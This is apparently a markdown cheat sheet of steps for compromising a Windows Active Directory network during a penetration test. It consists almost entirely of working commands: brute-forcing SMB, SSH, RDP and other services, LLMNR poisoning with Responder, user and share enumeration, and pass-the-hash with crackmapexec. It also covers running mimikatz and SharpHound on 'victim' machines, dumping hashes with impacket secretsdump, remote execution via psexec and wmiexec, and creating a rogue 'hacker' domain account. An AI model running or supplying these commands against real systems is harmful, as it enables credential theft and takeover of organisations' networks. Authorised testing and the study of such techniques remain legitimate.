# Steps:-
```
1. First of all we want Inventory of organization
2. Separate IP’S of Systems, Servers, Networking Devices   
3. Verify these IP'S Using PingInfo / AngryIPScanner
4. Standeruser For Auth Scan but try from your END to find user/pass
```
# Target 
```
For Ad Systems
1). Getting IP
2). Getting Local USER
3). Getting Local USER PASSWORD
4). Dump All Hashes 
5). Enumerate for AD User
6). Enumerate for AD User Password
7). Enumerate for AD Domain
8). Enumerate for AD Domain Password
9). Login
```
# Brute-Force As Local User On These Port's 
```
FTP(21) 
SSH(22) 
Kerberos(89) 
SMB(139/445) 
LDAP(389) 
MSSQL(1433/1434) 
MYSQL(3306) 
RDP(3389) 
VNC(5900)
```
# Tool 1. TIP ( But Go For SMB First ) Only For local user account.
```
msfconsole
auxiliary/scanner/smb/smb_login
set PASS_FILE /root/Desktop/pass.txt
set USER_FILE /root/Desktop/user.txt
set RHOSTS file:/root/Desktop/host.txt
```
```
use auxiliary/scanner/smb/smb_enumshares
set rhosts 192.168.1.17
set smbuser user
set smbpass pass
exploit
```
```
use auxiliary/scanner/smb/smb_lookupsid
set rhosts 192.168.1.17
set smbuser user
set smbpass pass
exploit
```
# If AD Implemented.
```
set SMBDomain ADDomain 
```
# If LOCKOUT Policy is Set Then Use.
```
set ABORT_ON_LOCKOUT true
```
# Tool 2. Getting USERLLMNR/NBT-NS Poising with the help of Responder.
```
sudo responder -I ens33 -wdrf
```
# Tool 3. ENUM4LINUX.
```
enum4linux -U 10.10.0.50
enum4linux -S 10.10.0.50
enum4linux -P 10.10.0.50
enum4linux -o 10.10.0.50
enum4linux -U 10.10.0.50
enum4linux -a 10.10.0.50
```
# Tool 4. SMBMAP.
```
smbmap -H 192.168.1.40
smbmap -H 192.168.1.17 -u user -p pass

```
# Tool 5. SMBCLIENT.
```
smbclient -L //10.10.0.50/
smbclient -L //10.10.0.50/ -U '' -N
smbclient //10.10.0.50/tmp
```
# Tool 6. KERBRUTE. 
```
msf> use auxiliary/gather/kerberos_enumusers
gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>
crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username
enum4linux -a -u "user" -p "password" <DC IP>
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

# Tool 7. Bloodhound.
```
First Start ------>>>>> neo4j console
Open it in browser ------>>>>> http://localhost:7474/
Login with ------>>>>> neo4j/123456 Default pass is {neo4j/neo4j}
Open ------>>>>> bloodhound in terminal
Login ------>>>>> user/pass
```

# <h3> Connect with victim windows systems and put these 3 files. </h3>
```
1). mimikatz.exe
2). powerView.ps1
3). SharpHound.ps1
```

# <h3> Use these cmds in victim systems. </h3>
```
1). powershell -ep bypass
2). ..\SharpHound.ps1
3). Invoke-Bloodhound -CollectionMethod All -Domain controller.local -ZipFileName loot.Zip
```

# <h3> Take loot.Zip file to import bloodhound in our systems.  </h3>
```
1). import graph ---->>> uploaded file here
2). Check it and enjoy it.
```

# Tool 8. IMPACKET.
```
impacket-psexec ad.domain/user:pass@IP
impacket-wmiexec ad.domain/user:pass@IP
impacket-secretsdump ad.domain/user:pass@IP
impacket-GetADUsers ad.domain/user:pass@IP
impacket-mimikatz ad.domain/user:pass@IP
impacket-smbpasswd ad.domain/user:pass@IP
```
# Tool 9. RPC-Client.
```
rpcclient -U ad.domain%user:pass IP
Domain Information Query ----->>>> querydominfo
Enumerating Domain Users ----->>>> enumdomusers
Enumerating Domain Groups ----->>>> enumdomgroups
Group Queries ----->>>> querygroup 0x200
User Queries ----->>>> queryuser User
Enumerating Privileges ----->>>> enumprivs
Get Domain Password Information ----->>>> getdompwinfo
Creating Domain User  ----->>>> createdomuser hacker  ----->>>> setuserinfo2 hacker 24 Password@1
Delete Domain User ----->>>> deletedomuser hacker
Net Share Enumeration ----->>>> netshareenumall/netshareenum
```
# Exploit Services by Searchsploit, Exploit DB
